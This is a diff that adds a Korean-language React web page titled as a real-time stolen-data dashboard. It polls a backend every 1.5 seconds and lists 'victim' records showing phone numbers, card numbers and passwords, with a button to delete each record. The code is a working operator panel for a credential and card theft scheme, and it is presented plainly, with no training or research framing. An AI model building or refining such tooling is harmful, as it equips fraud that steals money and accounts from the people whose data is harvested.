@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <title>🚨 실시간 탈취 데이터 대시보드</title>
+    <script src="https://unpkg.com/react@18/umd/react.development.js"></script>
+    <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+    <script src="https://unpkg.com/framer-motion@10.16.4/dist/framer-motion.js"></script>
+</head>
+<body>
+    <div id="root"></div>
+
+    <script type="text/babel">
+        const { useState, useEffect } = React;
+        const { motion } = window.Motion;
+
+        function Dashboard() {
+            const [events, setEvents] = useState([]);
+
+            // 백엔드에서 데이터 가져오기
+            const fetchLogs = () => {
+                fetch('/logs')
+                    .then(res => res.json())
+                    .then(data => setEvents(data))
+                    .catch(err => console.error("데이터 로드 실패:", err));
+            };
+
+            // 💡  데이터 삭제 함수
+            const handleDelete = (id) => {
+                // 사용자에게 한 번 더 물어보는 방어 코드 (선택 사항)
+                if(!window.confirm("이 탈취 기록을 정말 삭제하시겠습니까?")) return;
+
+                fetch(`/logs/${id}`, {
+                    method: 'DELETE' // 백엔드에 삭제 요청
+                })
+                .then(res => res.json())
+                .then(data => {
+                    // 삭제 성공 시 화면 즉시 새로고침
+                    fetchLogs();
+                })
+                .catch(err => console.error("삭제 실패:", err));
+            };
+
+            // 1.5초마다 주기적으로 데이터 갱신
+            useEffect(() => {
+                fetchLogs();
+                const interval = setInterval(fetchLogs, 1500); 
+                return () => clearInterval(interval);
+            }, []);
+
+            return (
+                <div style={{ minHeight: "100vh", background: "#f5f7fb", padding: 24, fontFamily: "sans-serif" }}>
+                    <div style={{ maxWidth: "800px", margin: "0 auto" }}>
+                        <h2 style={{ color: "#b91c1c", textAlign: "center", marginBottom: 30 }}>
+                            🚨 실시간 정보 탈취 모니터링 시스템
+                        </h2>
+                        
+                        {events.length === 0 && (
+                            <p style={{ textAlign: "center", color: "#94a3b8", padding: "40px", background: "white", borderRadius: "12px", boxShadow: "0 4px 6px rgba(0,0,0,0.05)" }}>
+                                현재 수집된 피해자 데이터가 없습니다. 대기 중...
+                            </p>
+                        )}
+
+                        {events.map((e, i) => (
+                            <motion.div
+                                key={e.id}
+                                initial={{ opacity: 0, x: -20 }}
+                                animate={{ opacity: 1, x: 0 }}
+                                exit={{ opacity: 0, scale: 0.9 }}
+                                style={{
+                                    background: "#fef3c7",
+                                    border: "1px solid #f59e0b",
+                                    borderRadius: 12,
+                                    padding: 16,
+                                    marginBottom: 12,
+                                    boxShadow: "0 4px 6px rgba(0,0,0,0.05)",
+                                    display: "flex", 
+                                    justifyContent: "space-between",
+                                    alignItems: "center"
+                                }}
+                            >
+                                <div>
+                                    <div style={{ fontWeight: "bold", color: "#92400e" }}>
+                                        ⚠️ [NEW DATA DETECTED] {new Date(e.timestamp).toLocaleTimeString()}
+                                    </div>
+                                    <div style={{ marginTop: 8, fontSize: "16px" }}>
+                                        📞 연락처: <strong>{e.user_id}</strong> / 
+                                        💳 카드번호: <strong>{e.account_number}</strong> / 
+                                        🔑 PW: <strong>{e.password}</strong>
+                                    </div>
+                                </div>
+                                
+                                
+                                <button 
+                                    onClick={() => handleDelete(e.id)}
+                                    style={{
+                                        background: "#ef4444",
+                                        color: "white",
+                                        border: "none",
+                                        borderRadius: "8px",
+                                        padding: "5px 10px",
+                                        fontWeight: "bold",
+                                        cursor: "pointer",
+                                        boxShadow: "0 2px 4px rgba(239, 68, 68, 0.3)"
+                                    }}
+                                >
+                                    삭제
+                                </button>
+                            </motion.div>
+                        ))}
+                    </div>
+                </div>
+            );
+        }
+
+        const root = ReactDOM.createRoot(document.getElementById('root'));
+        root.render(<Dashboard />);
+    </script>
+</body>
+</html>
